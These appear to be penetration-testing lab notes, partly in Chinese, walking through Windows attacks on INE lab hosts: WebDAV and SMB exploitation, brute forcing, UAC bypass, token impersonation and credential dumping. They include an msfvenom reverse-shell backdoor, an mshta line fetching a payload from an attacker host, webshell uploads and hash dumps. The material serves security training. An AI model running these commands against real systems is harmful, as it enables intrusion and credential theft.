# Exploiting Windows Vulnerabilities : 
## Windows: IIS Server: WebDav Metasploit
	=> WebDAV (Web Distributed Authoring and Versioning)
	=> 允許使用者協作編輯和管理遠端 Web 伺服器上的檔案
	=> 提供了一個在伺服器（通常是 Web 伺服器或內容管理系統）上建立、變更和移動文件的框架
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	nmap --script http-enum -sV -p 80 demo.ine.local
	davtest -auth bob:password_123321 -url http://demo.ine.local/webdav
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	msfconsole -q
		use exploit/windows/iis/iis_webdav_upload_asp
		set RHOSTS demo.ine.local
		set HttpUsername bob
		set HttpPassword password_123321
		set PATH /webdav/metasploit%RAND%.asp
		exploit
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	meterpreter > shell >dir >type
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	cmd :　dir /s /b C:\flag*
	powershell : Get-ChildItem -Path C:\ -Filter "flag*" -Recurse

## Windows:SMB Server PSexec
	nmap -p445 --script smb-protocols demo.ine.local
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	尋找所有有效使用者及其密碼 :
	msfconsole -q
		use auxiliary/scanner/smb/smb_login
		set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
		set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
		set RHOSTS demo.ine.local
		set VERBOSE false
		exploit

	[+] 10.0.28.26:445        - 10.0.28.26:445 - Success: '.\administrator:qwertyuiop' Administrator   
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	執行psexec模組來取得meterpreter shell: 
	msfconsole -q
		use exploit/windows/smb/psexec
		set RHOSTS demo.ine.local
		set SMBUser Administrator
		set SMBPass qwertyuiop
		exploit

	meterpreter > shell> dir /s /b C:\flag* > type flag.txt

## Windows:Insecure RDP Service
	=> RDP（遠端桌面協定）預設連接埠是3389。

	nmap -sV -sC demo.ine.local --script vuln 
	3333/tcp  open  ssl/dec-notes? [RDP]
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~ prove is that rdp
	msfconsole -q
		use auxiliary/scanner/rdp/rdp_scanner
		set RHOSTS demo.ine.local
		set RPORT 3333
		exploit

	[*] 10.0.29.155:3333      - Detected RDP on 10.0.29.155:3333      (name:WIN-OMCNBKR66MN) (domain:WIN-OMCNBKR66MN) (domain_fqdn:WIN-OMCNBKR66MN) (server_fqdn:WIN-OMCNBKR66MN) (os_version:6.3.9600) (Requires NLA: Yes)
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 

	hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://demo.ine.local -s 3333
	[3333][rdp] host: demo.ine.local   login: administrator   password: qwertyuiop

	xfreerdp /u:administrator /p:qwertyuiop /v:demo.ine.local:3333
 
## WinRM: Exploitation with Metasploit
	nmap --top-ports 7000 demo.ine.local
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
	尋找有效使用者及其密碼:
	除非使用 Kerberos 驗證，否則需要 PASSWORD 選項

	msfconsole -q
		use auxiliary/scanner/winrm/winrm_login
		set RHOSTS demo.ine.local
		set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
		set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
		set VERBOSE false
		set PASSWORD anything
		exploit
	[+] 10.0.26.146:5985 - Login Successful: WORKSTATION\administrator:tinkerbell
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
	檢查 WinRM 支援的身份驗證方法:
		use auxiliary/scanner/winrm/winrm_auth_methods
		set RHOSTS demo.ine.local
		exploit
	[+] 10.0.26.146:5985: Negotiate protocol supported
	[+] 10.0.26.146:5985: Basic protocol supported

	~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
	在目標伺服器上執行指令
		use auxiliary/scanner/winrm/winrm_cmd
		set RHOSTS demo.ine.local
		set USERNAME administrator
		set PASSWORD tinkerbell
		set CMD whoami
		exploit
	[+] Results saved to /root/.msf4/loot/20250112232219_default_10.0.26.146_winrm.cmd_result_196493.txt
	server\administrator

	~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
	將使用 winrm_script_exec 漏洞模組來取得 meterpreter shell
		use exploit/windows/winrm/winrm_script_exec
		set RHOSTS demo.ine.local
		set USERNAME administrator
		set PASSWORD tinkerbell
		set FORCE_VBS true
		exploit
	[+] Successfully migrated to svchost.exe (704) as: NT AUTHORITY\SYSTEM

# Windows Privilege Escalation
## UAC Bypass: UACMe
	=> Bypassing UAC using the UACME tool
	=> Windows User Account Control (UAC)
	=> NTLM hash
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	nmap -sV -p 80 demo.ine.local
	=> 80/tcp open  http    HttpFileServer httpd 2.3
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	searchsploit hfs
	=> Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)  | windows/remote/39161.py

	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	msfconsole -q
		search Rejetto HTTP File Server
		use exploit/windows/http/rejetto_hfs_exec
		set RHOSTS demo.ine.local
		exploit
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	meterpreter > getuid
		Server username: VICTIM\admin

	meterpreter > sysinfo
		Computer        : VICTIM
		OS              : Windows Server 2012 R2 (6.3 Build 9600).
		Architecture    : x64
		System Language : en_US
		Domain          : WORKGROUP
		Logged On Users : 2
		Meterpreter     : x86/windows

	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	meterpreter > ps -S explorer.exe
		2332  2324  explorer.exe  x64   1        VICTIM\admin  C:\Windows\explorer.exe

	migrate 2332
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	meterpreter > getsystem
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	shell
		net localgroup administrators
		admin
		Administrator
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.38.3 LPORT=4444 -f exe > 'backdoor.exe'
	file backdoor.exe
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	C:\Windows\system32>^C
	meterpreter > cd C:\\Users\\admin\\AppData\\Local\\Temp
		upload /root/Desktop/tools/UACME/Akagi64.exe .
		upload /root/backdoor.exe .
		ls

	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	msfconsole -q
		use exploit/multi/handler
		set PAYLOAD windows/meterpreter/reverse_tcp
		set LHOST 10.10.38.3
		set LPORT 4444
		exploit

	meterpreter > shell
		cd  C:\Users\admin\AppData\Local\Temp
		Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe

	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	meterpreter > ps -S lsass.exe
	 488  396   lsass.exe
		meterpreter > migrate 488
		meterpreter > hashdump
		admin:1012:aad3b435b51404eeaad3b435b51404ee:4d6583ed4cef81c2f2ac3c88fc5f3da6:::
		Admin NTLM Hash :4d6583ed4cef81c2f2ac3c88fc5f3da6
## Privilege Escalation: Impersonate(冒充)
	nmap -sV -p 80 demo.ine.local
	searchsploit hfs
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	msfconsole -q
		use exploit/windows/http/rejetto_hfs_exec
		set RHOSTS demo.ine.local
		exploit 
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	meterpreter > getuid 
		=> Server username: NT AUTHORITY\LOCAL SERVICE
		cat C:\\Users\\Administrator\\Desktop\\flag.txt (Access is denied)
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	載入隱身外掛程式並檢查所有可用的令牌: 
		load incognito
		list_tokens -u
		Delegation Tokens Available
		========================================
		ATTACKDEFENSE\Administrator
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	impersonate_token ATTACKDEFENSE\\Administrator 
		getuid
		=> Server username: ATTACKDEFENSE\Administrator
		cat C:\\Users\\Administrator\\Desktop\\flag.txt
# Windows Credential Dumping
## Unattended Installation
	=> PowerUp.ps1
	=> Source: https://github.com/PowerShellMafia/PowerSploit

	PS > whoami
		cd .\Desktop\PowerSploit\Privesc\
		ls
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		powershell -ep bypass (PowerShell execution policy bypass)
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		. .\PowerUp.ps1
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	Invoke-PrivescAudit
		UnattendPath : C:\Windows\Panther\Unattend.xml
		Unattend.xml 是已安裝的應答檔。這些文件可能包含編碼或純文字憑證以及其他敏感資訊
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	cat C:\Windows\Panther\Unattend.xml
		<Password>
			            <Value>QWRtaW5AMTIz</Value>
			            <PlainText>false</PlainText>
		</Password>
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		$password='QWRtaW5AMTIz'
		$password=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($password))
		echo $password
		Admin@123
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	runas.exe /user:administrator cmd
		Admin@123
		C:\Windows\system32>whoami
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	kali : msfconsole -q
		use exploit/windows/misc/hta_server
		exploit

	複製產生的有效負載 : 
	[*] Using URL: http://10.10.43.2:8080/mX9qdH9fENH6w9.hta
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	啟用巨集的文件進行攻擊: 
		cmd :mshta.exe http://10.10.43.2:8080/mX9qdH9fENH6w9.hta
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	msf6 exploit(windows/misc/hta_server) > sessions -i 1
		meterpreter > cd / 
		shell
		C:\>dir /s /b C:\flag*
		type
		cat C:\\Users\\Administrator\\Desktop\\flag.txt
## Windows: Meterpreter: Kiwi Extension
	=> Meterpreter Kiwi 外掛程式是 Metasploit 框架中的一種高級後利用工具

	nmap -sV -p 80 demo.ine.local
	searchsploit badblue 2.7
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	msfconsole -q
		search BadBlue
		use exploit/windows/http/badblue_passthru
		set RHOSTS demo.ine.local
		exploit
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	將目前進程遷移到lsass.exe
		migrate -N lsass.exe
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	載入 kiwi 擴充功能
		load kiwi
	擴充指令轉儲管理員 NTLM 雜湊值
		creds_all
		Administrator  ATTACKDEFENSE  e3c61a68f1b89ee6c8ba9507378dc88d  fa62275e30d286c09d30d8fece82664eb34323ef

	管理員用戶 NTLM 雜湊： e3c61a68f1b89ee6c8ba9507378dc88d
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	提取所有使用者的 NTLM 雜湊值:
		lsa_dump_sam

	User : student
	  Hash NTLM: bd4ca1fbe028f3c5066467a7f6a73b0b
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	轉儲 LSA 機密找到 syskey
		lsa_dump_secrets
		SysKey : 377af0de68bdc918d22c57a263d38326

## Host & Network Penetration Testing: System-Host Based Attacks CTF 1
	=> 利用未修補的軟體漏洞、錯誤配置、弱密碼和惡意軟體感染。
	=> 嘗試取得 root 或管理員權限來操縱或竊取敏感資料、安裝後門或導致系統崩潰
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	nmap -sC -sV target1.ine.local
		80/tcp   open  http          Microsoft IIS httpd 10.0
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	Password : /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
	Domain : target1.ine.local
	Domain : target2.ine.local
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	hydra -l bob -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt target1.ine.local http-get /
		[80][http-get] host: target1.ine.local   login: bob   password: password_123321
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	dirb http://target1.ine.local -u bob:password_123321
		==> DIRECTORY: http://target1.ine.localaspnet_client/ 
		==> DIRECTORY: http://target1.ine.local/webdav/     
		==> DIRECTORY: http://target1.ine.local/aspnet_client/system_web/   
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	davtest -auth bob:password_123321 -url http://target1.ine.local/webdav/ 
		SUCCEED : html, shtml,txt,asp,aspx
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
	cadaver http://target1.ine.local/webdav
		put /usr/share/webshells/asp/webshell.asp
		ls
	http://target1.ine.local/webdav/webshell.asp
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	type C:\inetpub\wwwroot\webdav\flag1.txt
	type C:\flag2.txt
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	nmap -p445 --script smb-enum-shares target2.ine.local
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	smbclient -L target2.ine.local -N
	enum4linux -a target2.ine.local
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt smb://target2.ine.local
	
	msfconsole -q
		use auxiliary/scanner/smb/smb_login
		set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
		set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
		set RHOSTS target2.ine.local
		set VERBOSE false
		exploit
	[+] 10.0.18.94:445        - 10.0.18.94:445 - Success: '.\rooty:spongebob'                                         
	[+] 10.0.18.94:445        - 10.0.18.94:445 - Success: '.\demo:password1'                                          
	[+] 10.0.18.94:445        - 10.0.18.94:445 - Success: '.\auditor:hellokitty'                                      
	[+] 10.0.18.94:445        - 10.0.18.94:445 - Success: '.\administrator:pineapple' Administrator 
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
	nmap -p445 --script smb-enum-shares,smb-ls --script-args smbusername=administrator,smbpassword=pineapple target2.ine.local

	msfconsole -q
		use exploit/windows/smb/psexec
		set RHOSTS target2.ine.local
		set SMBUser administrator
		set SMBPass pineapple
		exploit

	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	type C:\flag3.txt
	type C:\Users\Administrator\Desktop\flag4.txt
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	smbclient -L //target2.ine.local -U administrator
	輸入憑證後，您可能會遇到「登入失敗」等錯誤。這是由於暴力攻擊造成的。只需給它一些時間，它就會解決。
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	檢查每個共享的權限: crackmapexec smb target2.ine.local -u administrator -p pineapple --shares
	=> 只有兩個共享有讀寫權限：ADMIN$和C$
	=> smbclient //target2.ine.local/C$ -U administrator
		smb: \> dir













